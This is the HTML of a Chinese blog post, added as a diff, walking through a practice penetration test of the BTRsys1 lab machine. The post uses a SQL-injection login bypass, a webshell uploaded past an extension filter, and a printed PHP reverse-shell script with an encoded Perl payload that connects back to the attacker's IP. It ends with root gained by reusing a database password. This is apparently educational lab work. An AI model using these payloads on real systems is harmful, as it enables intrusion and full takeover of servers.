@@ -1,0 +1,166 @@
+<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="format-detection" content="telephone=no"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><link rel="icon" href="/images/icons/favicon-16x16.png?v=2.5.0" type="image/png" sizes="16x16"><link rel="icon" href="/images/icons/favicon-32x32.png?v=2.5.0" type="image/png" sizes="32x32"><meta name="google-site-verification" content="QDXQenTtxQ6MwW-M_7k9lw39Kq7F4pwFO0u1QAPYlDE"><meta name="description" content="第一次做靶场渗透，如有不足，请多指教  攻击机：kali 2019.1靶机：BTRsys1">
+<meta property="og:type" content="article">
+<meta property="og:title" content="BTRsys1靶场渗透">
+<meta property="og:url" content="http://www.7ten7.top/2019/03/19/BTRsys1%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F/index.html">
+<meta property="og:site_name" content="7TEN7&#39;s Blog">
+<meta property="og:description" content="第一次做靶场渗透，如有不足，请多指教  攻击机：kali 2019.1靶机：BTRsys1">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://i.imgur.com/tMBR6Fm.png">
+<meta property="og:image" content="https://i.imgur.com/SPjVzHR.png">
+<meta property="og:image" content="https://i.imgur.com/rssSJ5n.png">
+<meta property="og:image" content="https://i.imgur.com/j07HJZA.png">
+<meta property="og:image" content="https://i.imgur.com/DWPjVEb.png">
+<meta property="og:image" content="https://i.imgur.com/2rsGvkE.png">
+<meta property="og:image" content="https://i.imgur.com/tac7tTd.png">
+<meta property="og:image" content="https://i.imgur.com/5hUHkC5.png">
+<meta property="article:published_time" content="2019-03-18T16:00:00.000Z">
+<meta property="article:modified_time" content="2020-05-04T17:02:15.227Z">
+<meta property="article:author" content="7TEN7">
+<meta property="article:tag" content="渗透">
+<meta property="article:tag" content="靶场">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://i.imgur.com/tMBR6Fm.png"><title>BTRsys1靶场渗透 | 7TEN7's Blog</title><link ref="canonical" href="http://www.7ten7.top/2019/03/19/BTRsys1%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F/"><link rel="alternate" href="/atom.xml" type="application/atom+xml"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.12.1/css/all.min.css" type="text/css"><link rel="stylesheet" href="/css/index.css?v=2.5.0"><script src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js" data-ad-client="ca-pub-4793862971469188" async=""></script><script>var Stun = window.Stun || {};
+var CONFIG = {
+  root: '/',
+  algolia: undefined,
+  assistSearch: undefined,
+  fontIcon: {"prompt":{"success":"fas fa-check-circle","info":"fas fa-arrow-circle-right","warning":"fas fa-exclamation-circle","error":"fas fa-times-circle"},"copyBtn":"fas fa-copy"},
+  sidebar: {"offsetTop":"20px","tocMaxDepth":6},
+  header: {"enable":true,"showOnPost":false,"scrollDownIcon":true},
+  postWidget: {"endText":true},
+  nightMode: {"enable":true},
+  back2top: {"enable":true},
+  codeblock: {"style":"simple","highlight":"ocean","wordWrap":false},
+  reward: false,
+  fancybox: false,
+  zoomImage: {"gapAside":"20px"},
+  galleryWaterfall: undefined,
+  lazyload: true,
+  pjax: undefined,
+  externalLink: {"icon":{"enable":true,"name":"fas fa-external-link-alt"}},
+  shortcuts: undefined,
+  prompt: {"copyButton":"复制","copySuccess":"复制成功","copyError":"复制失败"},
+  sourcePath: {"js":"js","css":"css","images":"images"},
+};
+
+window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 4.2.1"></head><body><div class="container" id="container"><header class="header" id="header"><div class="header-inner header-inner--height header-inner--bgcolor"><nav class="header-nav header-nav--sticky"><div class="header-nav-inner"><div class="header-nav-menubtn"><i class="fas fa-bars"></i></div><div class="header-nav-menu"><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/"><span class="header-nav-menu-item__icon"><i class="fas fa-home"></i></span><span class="header-nav-menu-item__text">首页</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/archives/"><span class="header-nav-menu-item__icon"><i class="fas fa-folder-open"></i></span><span class="header-nav-menu-item__text">归档</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/tags/"><span class="header-nav-menu-item__icon"><i class="fas fa-tags"></i></span><span class="header-nav-menu-item__text">标签</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/friends/"><span class="header-nav-menu-item__icon"><i class="fas fa-link"></i></span><span class="header-nav-menu-item__text">友链</span></a></div></div><div class="header-nav-mode"><div class="mode"><div class="mode-track"><span class="mode-track-moon"></span><span class="mode-track-sun"></span></div><div class="mode-thumb"></div></div></div></div></nav></div></header><main class="main" id="main"><div class="main-inner"><div class="content-wrap" id="content-wrap"><div class="content" id="content"><!-- Just used to judge whether it is an article page--><div id="is-post"></div><div class="post"><header class="post-header"><h1 class="post-title">BTRsys1靶场渗透</h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">发表于</span><span class="post-meta-item__value">2019-03-19</span></span><span class="post-meta-item post-meta-item--wordcount"><span class="post-meta-item__icon"><i class="far fa-file-word"></i></span><span class="post-meta-item__info">字数统计</span><span class="post-meta-item__value">1.1k</span></span><span class="post-meta-item post-meta-item--readtime"><span class="post-meta-item__icon"><i class="far fa-clock"></i></span><span class="post-meta-item__info">阅读时长</span><span class="post-meta-item__value">9分</span></span></div></header><div class="post-body"><blockquote>
+<p>第一次做靶场渗透，如有不足，请多指教</p>
+</blockquote>
+<p>攻击机：kali 2019.1<br>靶机：BTRsys1<br><a id="more"></a></p>
+
+        <h1 id="确认靶场ip"   >
+          <a href="#确认靶场ip" class="heading-link"><i class="fas fa-link"></i></a>确认靶场ip</h1>
+      <p>因为靶机网络为NAT模式，kali也为NAT，所以靶机和攻击机在同一网段，nmap扫描同网段存活主机<br><figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">root@kali0x0:~<span class="comment"># nmap -sP 192.168.65.0/24</span></span><br><span class="line">Starting Nmap 7.70 ( https://nmap.org ) at 2019-03-19 22:00 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.65.1</span><br><span class="line">Host is up (0.00026s latency).</span><br><span class="line">MAC Address: 00:50:56:C0:00:08 (VMware)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.65.2</span><br><span class="line">Host is up (0.00016s latency).</span><br><span class="line">MAC Address: 00:50:56:F1:64:F6 (VMware)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.65.142</span><br><span class="line">Host is up (0.0018s latency).</span><br><span class="line">MAC Address: 00:0C:29:17:1B:E4 (VMware)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.65.254</span><br><span class="line">Host is up (0.00069s latency).</span><br><span class="line">MAC Address: 00:50:56:E0:A8:2E (VMware)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.65.131</span><br><span class="line">Host is up.</span><br><span class="line">Nmap <span class="keyword">done</span>: 256 IP addresses (5 hosts up) scanned <span class="keyword">in</span> 18.89 seconds</span><br><span class="line">root@kali0x0:~<span class="comment">#</span></span><br></pre></td></tr></table></div></figure><br>可得知靶机的 ip 为 192.168.65.142</p>
+
+        <h1 id="确认靶场开放的服务"   >
+          <a href="#确认靶场开放的服务" class="heading-link"><i class="fas fa-link"></i></a>确认靶场开放的服务</h1>
+      <figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">root@kali0x0:~<span class="comment"># nmap -sV 192.168.65.142</span></span><br><span class="line">Starting Nmap 7.70 ( https://nmap.org ) at 2019-03-19 22:05 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.65.142</span><br><span class="line">Host is up (0.0042s latency).</span><br><span class="line">Not shown: 997 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">21/tcp open  ftp     vsftpd 3.0.2</span><br><span class="line">22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))</span><br><span class="line">MAC Address: 00:0C:29:17:1B:E4 (VMware)</span><br><span class="line">Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 7.78 seconds</span><br><span class="line">root@kali0x0:~<span class="comment">#</span></span><br></pre></td></tr></table></div></figure>
+<p>可知靶机开放了3个服务，其中ssh的话可以进行账号密码爆破，由于没爆出账号密码，所以这里选择80端口开放的web服务下手。</p>
+
+        <h1 id="访问web页面，寻找漏洞点"   >
+          <a href="#访问web页面，寻找漏洞点" class="heading-link"><i class="fas fa-link"></i></a>访问web页面，寻找漏洞点</h1>
+      <p>
+        <img   class="lazyload lazyload-gif"
+          src="/images/loading.svg" data-src="https://i.imgur.com/tMBR6Fm.png"  alt="">
+      </p>
+<p>没发现可用信息，用目录扫描器扫描下网站目录<br>
+        <img   class="lazyload lazyload-gif"
+          src="/images/loading.svg" data-src="https://i.imgur.com/SPjVzHR.png"  alt="">
+      </p>
+<p>进入页面，查看login页面的源代码<br>
+        <img   class="lazyload lazyload-gif"
+          src="/images/loading.svg" data-src="https://i.imgur.com/rssSJ5n.png"  alt="">
+      </p>
+<p>分析源代码中的上面这段代码，可知表单中的 user 字段的要求为邮箱，且后缀为 @btrisk.com ，而密码字段无限制，所以构造 user 为 <span class="exturl"><a class="exturl__link"   href="mailto:**admin@btrisk.com" >**admin@btrisk.com</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span><strong>，passwd 为万能密码</strong>‘or’1**，即可登录成功</p>
+
+        <h1 id="找到上传点，进行-getshell"   >
+          <a href="#找到上传点，进行-getshell" class="heading-link"><i class="fas fa-link"></i></a>找到上传点，进行 getshell</h1>
+      <p>登录后，进入到 personel.php 界面，其中有文件上传点，观察网页源代码<br>
+        <img   class="lazyload lazyload-gif"
+          src="/images/loading.svg" data-src="https://i.imgur.com/j07HJZA.png"  alt="">
+      </p>
+<p>可知文件上传的要求为只能上传 .jpg .gif .png 后缀的，进行抓到改包，即可绕过限制，上传一句话 webshell</p>
+<p>
+        <img   class="lazyload lazyload-gif"
+          src="/images/loading.svg" data-src="https://i.imgur.com/DWPjVEb.png"  alt="">
+      </p>
+<p>菜刀连接测试成功</p>
+
+        <h1 id="提权到ROOT"   >
+          <a href="#提权到ROOT" class="heading-link"><i class="fas fa-link"></i></a>提权到ROOT</h1>
+      <p>菜刀查看发现网站根目录下的 config.php ，发现本地数据库连接账户密码为 root和toor</p>
+<p>可以登录数据库查看是否可以提权</p>
+
+        <h2 id="通过-php-反弹-shell"   >
+          <a href="#通过-php-反弹-shell" class="heading-link"><i class="fas fa-link"></i></a>通过 php 反弹 shell</h2>
+      <p>在上传一个 php 反弹 shell 脚本，就是上图菜刀连接测试中的 myshell.php 文件<br>这里给出<strong>php反弹shell脚本</strong>的内容</p>
+<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">which</span><span class="params">($pr)</span> </span>&#123;</span><br><span class="line">    $path = execute(<span class="string">"which $pr"</span>);</span><br><span class="line">    <span class="keyword">return</span> ($path ? $path : $pr);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">execute</span><span class="params">($cfe)</span> </span>&#123;</span><br><span class="line">    $res = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">if</span> ($cfe) &#123;</span><br><span class="line">        <span class="keyword">if</span>(function_exists(<span class="string">'exec'</span>)) &#123;</span><br><span class="line">            @exec($cfe,$res);</span><br><span class="line">            $res = join(<span class="string">"\n"</span>,$res);</span><br><span class="line">        &#125; <span class="keyword">elseif</span>(function_exists(<span class="string">'shell_exec'</span>)) &#123;</span><br><span class="line">            $res = @shell_exec($cfe);</span><br><span class="line">        &#125; <span class="keyword">elseif</span>(function_exists(<span class="string">'system'</span>)) &#123;</span><br><span class="line">            @ob_start();</span><br><span class="line">            @system($cfe);</span><br><span class="line">            $res = @ob_get_contents();</span><br><span class="line">            @ob_end_clean();</span><br><span class="line">        &#125; <span class="keyword">elseif</span>(function_exists(<span class="string">'passthru'</span>)) &#123;</span><br><span class="line">            @ob_start();</span><br><span class="line">            @passthru($cfe);</span><br><span class="line">            $res = @ob_get_contents();</span><br><span class="line">            @ob_end_clean();</span><br><span class="line">        &#125; <span class="keyword">elseif</span>(@is_resource($f = @popen($cfe,<span class="string">"r"</span>))) &#123;</span><br><span class="line">            $res = <span class="string">''</span>;</span><br><span class="line">            <span class="keyword">while</span>(!@feof($f)) &#123;</span><br><span class="line">                $res .= @fread($f,<span class="number">1024</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            @pclose($f);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $res;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">cf</span><span class="params">($fname,$text)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>($fp=@fopen($fname,<span class="string">'w'</span>)) &#123;</span><br><span class="line">        @fputs($fp,@base64_decode($text));</span><br><span class="line">        @fclose($fp);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$yourip = <span class="string">"192.168.65.131"</span>;</span><br><span class="line">$yourport = <span class="string">'7777'</span>;</span><br><span class="line">$usedb = <span class="keyword">array</span>(<span class="string">'perl'</span>=&gt;<span class="string">'perl'</span>,<span class="string">'c'</span>=&gt;<span class="string">'c'</span>);</span><br><span class="line">$back_connect=<span class="string">"IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGNtZD0gImx5bngiOw0KJHN5c3RlbT0gJ2VjaG8gImB1bmFtZSAtYWAiO2Vj"</span>.</span><br><span class="line">    <span class="string">"aG8gImBpZGAiOy9iaW4vc2gnOw0KJDA9JGNtZDsNCiR0YXJnZXQ9JEFSR1ZbMF07DQokcG9ydD0kQVJHVlsxXTsNCiRpYWRkcj1pbmV0X2F0b24oJHR"</span>.</span><br><span class="line">    <span class="string">"hcmdldCkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRwb3J0LCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKT"</span>.</span><br><span class="line">    <span class="string">"sNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoI"</span>.</span><br><span class="line">    <span class="string">"kVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQi"</span>.</span><br><span class="line">    <span class="string">"KTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgkc3lzdGVtKTsNCmNsb3NlKFNUREl"</span>.</span><br><span class="line">    <span class="string">"OKTsNCmNsb3NlKFNURE9VVCk7DQpjbG9zZShTVERFUlIpOw=="</span>;</span><br><span class="line">cf(<span class="string">'/tmp/.bc'</span>,$back_connect);</span><br><span class="line">$res = execute(which(<span class="string">'perl'</span>).<span class="string">" /tmp/.bc $yourip $yourport &amp;"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></div></figure>
+<blockquote>
+<p>这个脚本也是网上 copy 的，不太清楚有没有什么问题</p>
+</blockquote>
+<p>在 kali 上执行监听<br><code>nc -lvp 7777</code></p>
+<p>访问上传的<strong>php反弹shell脚本</strong></p>
+<p>
+        <img   class="lazyload lazyload-gif"
+          src="/images/loading.svg" data-src="https://i.imgur.com/2rsGvkE.png"  alt="">
+      <br>得到一个无交互的shell</p>
+<p>在弹回的shell上执行 <code>python -c &#39;__import__(&quot;pty&quot;).spawn(&quot;/bin/bash&quot;)&#39;</code>，取得一个有交互界面的shell</p>
+<p>参考：<span class="exturl"><a class="exturl__link"   href="https://blog.evalbug.com/2018/07/25/antsword_prompt_shell/"  target="_blank" rel="noopener">https://blog.evalbug.com/2018/07/25/antsword_prompt_shell/</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+
+        <h2 id="查看数据库，判断能否通过数据库提权"   >
+          <a href="#查看数据库，判断能否通过数据库提权" class="heading-link"><i class="fas fa-link"></i></a>查看数据库，判断能否通过数据库提权</h2>
+      <p>在拿到 交互shell 后就可以登录数据库查看数据库内容，然后判断是否有可利用的点<br>
+        <img   class="lazyload lazyload-gif"
+          src="/images/loading.svg" data-src="https://i.imgur.com/tac7tTd.png"  alt="">
+      </p>
+<p>根据猜测，去尝试登录root用户，看是否能登录成功！</p>
+
+        <h2 id="密码试验成功，提权到root"   >
+          <a href="#密码试验成功，提权到root" class="heading-link"><i class="fas fa-link"></i></a>密码试验成功，提权到root</h2>
+      <p>
+        <img   class="lazyload lazyload-gif"
+          src="/images/loading.svg" data-src="https://i.imgur.com/5hUHkC5.png"  alt="">
+      </p>
+<p>nice，登录成功，获得<strong>root</strong>权限</p>
+
+        <h1 id="总结"   >
+          <a href="#总结" class="heading-link"><i class="fas fa-link"></i></a>总结</h1>
+      <p>第一次体验渗透，第一次拿到root权限，还是蛮开心的，虽然这个靶场很简单，但也通过这个简单的靶场，学到了不少东西，所以想详细的记录和总结一下。以前都是做CTF题目比较多，现在玩这种综合性的渗透感觉对于思维的连贯性还有蛮大锻炼的，看到一个点，就要想想，这里有什么能利用的。</p>
+</div><footer class="post-footer"><div class="post-ending ending"><div class="ending__text">------ 本文结束，感谢您的阅读 ------</div></div><div class="post-copyright copyright"><div class="copyright-author"><span class="copyright-author__name">本文作者: </span><span class="copyright-author__value"><a href="http://www.7ten7.top">7TEN7</a></span></div><div class="copyright-link"><span class="copyright-link__name">本文链接: </span><span class="copyright-link__value"><a href="http://www.7ten7.top/2019/03/19/BTRsys1%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F/">http://www.7ten7.top/2019/03/19/BTRsys1%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F/</a></span></div><div class="copyright-notice"><span class="copyright-notice__name">版权声明: </span><span class="copyright-notice__value">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" rel="external nofollow" target="_blank">BY-NC-SA</a> 许可协议。转载请注明出处！</span></div></div><div class="post-tags"><span class="post-tags-item"><span class="post-tags-item__icon"><i class="fas fa-tag"></i></span><a class="post-tags-item__link" href="http://www.7ten7.top/tags/%E6%B8%97%E9%80%8F/">渗透</a></span><span class="post-tags-item"><span class="post-tags-item__icon"><i class="fas fa-tag"></i></span><a class="post-tags-item__link" href="http://www.7ten7.top/tags/%E9%9D%B6%E5%9C%BA/">靶场</a></span></div><nav class="post-paginator paginator"><div class="paginator-prev"><a class="paginator-prev__link" href="/2019/04/05/PHP%E4%B8%ADSESSION%E5%BA%8F%E5%88%97%E5%8C%96/"><span class="paginator-prev__icon"><i class="fas fa-angle-left"></i></span><span class="paginator-prev__text">PHP 中 SESSION 序列化</span></a></div><div class="paginator-next"><a class="paginator-next__link" href="/2019/03/19/%E5%B7%A5%E5%85%B7%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E5%8F%82%E6%95%B0/"><span class="paginator-prev__text">kali常用工具</span><span class="paginator-next__icon"><i class="fas fa-angle-right"></i></span></a></div></nav></footer></div></div><div class="comments" id="comments"><div id="valine-container"></div></div></div><div class="sidebar-wrap" id="sidebar-wrap"><aside class="sidebar" id="sidebar"><div class="sidebar-nav"><span class="sidebar-nav-toc current">文章目录</span><span class="sidebar-nav-ov">站点概览</span></div><section class="sidebar-toc"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#确认靶场ip"><span class="toc-number">1.</span> <span class="toc-text">
+          确认靶场ip</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#确认靶场开放的服务"><span class="toc-number">2.</span> <span class="toc-text">
+          确认靶场开放的服务</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#访问web页面，寻找漏洞点"><span class="toc-number">3.</span> <span class="toc-text">
+          访问web页面，寻找漏洞点</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#找到上传点，进行-getshell"><span class="toc-number">4.</span> <span class="toc-text">
+          找到上传点，进行 getshell</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#提权到ROOT"><span class="toc-number">5.</span> <span class="toc-text">
+          提权到ROOT</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#通过-php-反弹-shell"><span class="toc-number">5.1.</span> <span class="toc-text">
+          通过 php 反弹 shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#查看数据库，判断能否通过数据库提权"><span class="toc-number">5.2.</span> <span class="toc-text">
+          查看数据库，判断能否通过数据库提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#密码试验成功，提权到root"><span class="toc-number">5.3.</span> <span class="toc-text">
+          密码试验成功，提权到root</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#总结"><span class="toc-number">6.</span> <span class="toc-text">
+          总结</span></a></li></ol></section><!-- ov = overview--><section class="sidebar-ov hide"><div class="sidebar-ov-author"><div class="sidebar-ov-author__avatar"><img class="sidebar-ov-author__avatar_img" src="/images/author/author.png" alt="avatar"></div><p class="sidebar-ov-author__text">7TEN7</p></div><div class="sidebar-ov-feed"><span class="sidebar-ov-feed-rss"><a class="sidebar-ov-feed-rss__link" href="/atom.xml" target="_blank" rel="noopener"><span class="sidebar-ov-feed-rss__icon"><i class="fas fa-rss"></i></span><span>RSS 订阅</span></a></span></div><div class="sidebar-ov-state"><a class="sidebar-ov-state-item sidebar-ov-state-item--posts" href="/archives/"><div class="sidebar-ov-state-item__count">55</div><div class="sidebar-ov-state-item__name">归档</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--tags" href="/tags/"><div class="sidebar-ov-state-item__count">32</div><div class="sidebar-ov-state-item__name">标签</div></a></div><div class="sidebar-ov-cc"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" target="_blank" rel="noopener" data-popover="知识共享许可协议" data-popover-pos="up"><img src="/images/cc-by-nc-sa.svg"></a></div></section><div class="sidebar-reading"><div class="sidebar-reading-info"><span class="sidebar-reading-info__text">你已阅读了 </span><span class="sidebar-reading-info__num">0</span><span class="sidebar-reading-info__perc">%</span></div><div class="sidebar-reading-line"></div></div></aside></div><div class="clearfix"></div></div></main><footer class="footer" id="footer"><div class="footer-inner"><div><span>Copyright © 2021</span><span class="footer__devider"></span><span>7TEN7</span></div></div></footer><div class="loading-bar" id="loading-bar"><div class="loading-bar__progress"></div></div><div class="back2top" id="back2top"><span class="back2top__icon"><i class="fas fa-rocket"></i></span></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@v3.4.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.ui.min.js"></script><script src="https://cdn.jsdelivr.net/npm/canvas-nest.js@1.0.1/dist/canvas-nest.min.js" color="255,255,255" opacity="1" count="200" zIndex="-1"></script><script src="https://cdn.jsdelivr.net/npm/lazyload@2.0.0-rc.2/lazyload.min.js"></script><script src="https://cdn.jsdelivr.net/npm/leancloud-storage@latest/dist/av-min.js"></script><script src="https://cdn.jsdelivr.net/npm/valine@latest/dist/Valine.min.js"></script><script>function loadValine () {
+  var GUEST_INFO = ['nick', 'mail', 'link'];
+  var guest_info = 'nick,mail,link';
+
+  guest_info = guest_info.split(',').filter(function(item) {
+    return GUEST_INFO.indexOf(item) > -1;
+  });
+  new Valine({
+    el: '#valine-container',
+    appId: 'Nzl7LsK4moQuOsIfeWfbc8Rz-gzGzoHsz',
+    appKey: '5xmoJuWrMWHpI7pwtJviyIh6',
+    notify: true,
+    verify: true,
+    placeholder: 'Just go go',
+    avatar: 'mp',
+    meta: guest_info,
+    pageSize: '10' || 10,
+    visitor: false,
+    recordIP: true,
+    lang: '' || 'zh-cn',
+    path: window.location.pathname
+  });
+}
+
+if (false) {
+  loadValine();
+} else {
+  window.addEventListener('DOMContentLoaded', loadValine, false);
+}</script><script src="/js/utils.js?v=2.5.0"></script><script src="/js/stun-boot.js?v=2.5.0"></script><script src="/js/scroll.js?v=2.5.0"></script><script src="/js/header.js?v=2.5.0"></script><script src="/js/sidebar.js?v=2.5.0"></script><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/assets/shizuku.model.json"},"display":{"position":"right","width":260,"height":380,"vOffset":5},"mobile":{"show":true},"log":false});</script></body></html>
